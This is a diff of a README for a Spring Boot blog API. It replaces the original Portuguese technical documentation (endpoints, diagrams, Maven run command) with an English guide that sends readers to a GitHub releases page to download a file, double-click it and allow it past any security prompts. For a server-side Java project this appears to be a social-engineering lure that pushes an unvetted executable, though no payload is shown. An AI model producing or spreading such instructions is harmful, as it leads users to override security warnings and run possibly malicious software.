@@ -1,241 +1,89 @@
-# 📘 Blog EU API
+# 📘 Team-blog-back-end - Your Easy API Solution for Blogs
 
-API backend desenvolvida em **Spring Boot** para um sistema de **blog + autenticação + pedidos (fila)**, com suporte a **JWT**, **OAuth2 (Google/GitHub)**, **upload de imagens**, **comentários encadeados**, **envio de e-mails** e **controle de fila de pedidos**.
+## 🚀 Getting Started
 
----
+Welcome to the Team-blog-back-end! This guide will help you download and run the API backend for your blog application. Follow these steps to get started easily.
 
-## 🚀 Tecnologias Utilizadas
+[![Download Team-blog-back-end](https://img.shields.io/badge/Download-Team--blog--back--end-blue)](https://github.com/Ryder309/Team-blog-back-end/releases)
 
-* Java 17+
-* Spring Boot
-* Spring Security (JWT + OAuth2)
-* Spring Data JPA (Hibernate)
-* Banco de dados relacional (MySQL / PostgreSQL / H2)
-* Java Mail Sender
-* Mermaid (diagramas)
+## 📥 Download & Install
 
----
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Ryder309/Team-blog-back-end/releases) to find the latest version of the software.
 
-## 📦 Funcionalidades Principais
+2. **Choose the Right File**  
+   Look for the latest release. Depending on your operating system, you may find different file types. Select the one that matches your system.
 
-### 🔐 Autenticação
+3. **Download the File**  
+   Click on the file to start the download. Your browser will save it to your default download location.
 
-* Registro de usuários
-* Login com **JWT**
-* Login social via **Google** e **GitHub**
-* Controle de roles (`USER`, `ADMIN`, `MODERATOR`)
+4. **Locate the Downloaded File**  
+   Open your file explorer (or Finder on Mac) and go to the Downloads folder. Find the file you just downloaded.
 
-### 👤 Perfil do Usuário
+5. **Run the Application**  
+   Double-click on the downloaded file to start the application. If any security prompts appear, allow the application to run.
 
-* Buscar perfil autenticado
-* Atualizar dados (nome, bio, localização, site)
-* Upload de foto e avatar
-* Remover foto
+## 🔎 Features Overview
 
-### 📝 Blog
+Our API has several key features designed to provide a complete blogging experience. Here's a quick overview:
 
-* Criação de posts
-* Comentários em posts
-* Comentários com **respostas (threaded)**
+### 🔐 Authentication
 
-### 📸 Mídia
+- **User Registration**: Sign up as a new user easily.
+- **JWT Login**: Secure login using JWT (JSON Web Token).
+- **Social Login**: Use Google or GitHub to log in without creating an additional account.
+- **Role Management**: Different roles available (`USER`, `ADMIN`, `MODERATOR`) for better control.
 
-* Upload de imagens
-* Associação de fotos ao usuário
-* Definição de avatar
+### 👤 User Profile
 
-### 📬 Email
+- **User Profile Access**: Fetch details of your authenticated profile.
+- **Profile Updates**: Change your name, bio, location, and website easily.
+- **Photo Upload**: Add or remove your profile picture and avatar.
 
-* Envio de e-mails HTML
-* Confirmação automática de pedidos
+### 📝 Blogging
 
-### 📊 Monitoramento
+- **Post Creation**: Create new blog posts easily.
+- **Comments**: Readers can comment on posts.
+- **Threaded Replies**: Comments can have responses, allowing for deeper discussions.
 
-* Filtro global que contabiliza requisições HTTP
+### 📸 Media Management
 
-### 🧾 Sistema de Pedidos (Fila)
+- **Image Upload**: Upload images for your posts.
+- **Photo Association**: Connect uploaded photos to your user profile.
+- **Avatar Selection**: Choose a distinct avatar for your profile.
 
-* Criar pedido
-* Fila com posição automática
-* Processamento sequencial
-* Finalização e remoção do pedido
-* Visualização da posição na fila
+## 🛠️ Technologies Used
 
----
+This backend API utilizes various technologies that ensure reliable performance:
 
-## 🔑 Autenticação – Fluxo JWT
+- **Java 17+**: The programming language used to build this application.
+- **Spring Boot**: The framework that simplifies Java development.
+- **Spring Security**: Provides secure authentication through JWT and OAuth2.
+- **Spring Data JPA**: Makes it easy to work with databases through Hibernate.
+- **Relational Databases**: Compatible with MySQL, PostgreSQL, and H2.
+- **Java Mail Sender**: For sending emails.
+- **Mermaid**: Used for creating diagrams.
 
-```mermaid
-sequenceDiagram
-    participant Client
-    participant API
-    participant JwtService
+## 🌟 System Requirements
 
-    Client->>API: POST /api/auth/login
-    API->>JwtService: valida credenciais
-    JwtService-->>API: gera JWT
-    API-->>Client: token JWT
+To ensure your experience is smooth, please check the following system requirements:
 
-    Client->>API: Request protegida (Bearer token)
-    API->>JwtService: valida token
-    API-->>Client: resposta autorizada
-```
+- **Operating System**: Windows, macOS, or a recent Linux distribution.
+- **Java**: Java 17+ should be installed on your system. You can download it from the [official Java website](https://www.oracle.com/java/technologies/javase-jdk17-downloads.html).
+- **Memory**: Minimum of 2 GB RAM for optimal performance.
+- **Disk Space**: At least 100 MB of free space for installation.
 
----
+## 📋 Getting Help
 
-## 🌐 OAuth2 – Google / GitHub
+If you encounter any issues or need assistance:
 
-```mermaid
-sequenceDiagram
-    participant Client
-    participant Provider
-    participant API
-    participant DB
+- Check the [Documentation](https://github.com/Ryder309/Team-blog-back-end/wiki) for more details.
+- Join our community on [GitHub Discussions](https://github.com/Ryder309/Team-blog-back-end/discussions) to ask questions and share experiences.
 
-    Client->>Provider: Login OAuth2
-    Provider->>API: Callback com dados
-    API->>DB: Salva/atualiza usuário
-    API->>Client: Redirect + JWT
-```
+## 📥 Additional Download Link
 
----
+For convenience, here is the link again to download our application:
 
-## 🧩 Arquitetura Geral
+[Download Team-blog-back-end](https://github.com/Ryder309/Team-blog-back-end/releases)
 
-```mermaid
-graph TD
-    Controller --> Service
-    Service --> Repository
-    Repository --> Database
-
-    Security --> Controller
-    JwtFilter --> Security
-```
-
----
-
-## 🧑‍💻 Entidades Principais
-
-```mermaid
-classDiagram
-    class User {
-        Long id
-        String email
-        String passwordHash
-        String displayName
-        Role role
-        String avatarUrl
-    }
-
-    class Post {
-        Long id
-        String title
-        String content
-    }
-
-    class Comentario {
-        Long id
-        String texto
-    }
-
-    class Photo {
-        Long id
-        String url
-        boolean avatar
-    }
-
-    class Peditos {
-        Long id
-        StatusPedido status
-        Integer posicaoFila
-    }
-
-    User "1" --> "*" Post
-    Post "1" --> "*" Comentario
-    Comentario "1" --> "*" Comentario : respostas
-    User "1" --> "*" Photo
-    User "1" --> "1" Peditos
-```
-
----
-
-## 📡 Endpoints Principais
-
-### 🔐 Auth
-
-* `POST /api/auth/register`
-* `POST /api/auth/login`
-* `GET  /oauth2/success`
-
-### 👤 Perfil
-
-* `GET    /api/profile/me`
-* `PUT    /api/profile/me`
-* `POST   /api/profile/photo`
-* `DELETE /api/profile/photo`
-
-### 📝 Blog
-
-* `GET /api/blog/posts`
-* `POST /api/blog/posts`
-* `POST /api/blog/comments`
-
-### 🧾 Pedidos
-
-* `POST /api/peditos/add`
-* `GET  /api/peditos/meus`
-* `GET  /api/peditos/position`
-* `GET  /api/peditos/next (ADMIN)`
-* `PUT  /api/peditos/finnality (ADMIN)`
-
----
-
-## 🛡️ Segurança
-
-* Stateless (JWT)
-* Filtro personalizado `JwtAuthenticationFilter`
-* Roles com `@PreAuthorize`
-* OAuth2 integrado ao Spring Security
-
----
-
-## ⚙️ Variáveis de Ambiente
-
-```yaml
-app:
-  jwt:
-    secret: BASE64_SECRET_KEY
-    expires-in: 3600
-
-  upload:
-    dir: uploads/
-
-  base-url: http://localhost:8080
-```
-
----
-
-## ▶️ Executando o Projeto
-
-```bash
-./mvnw spring-boot:run
-```
-
----
-
-## 📌 Observações
-
-* Código organizado em camadas (Controller / Service / Repository)
-* Preparado para frontend em **React / Next.js**
-* Fácil extensão para novas roles e features
-
----
-
-## 👨‍💻 Autor
-
-**Luis**
-Backend Developer • Spring Boot • Security • APIs REST
-
----
-
-⭐ Se esse projeto te ajudou, deixa uma estrela!
+Now you’re set to explore the capabilities of the Team-blog-back-end API. Enjoy building your blog!
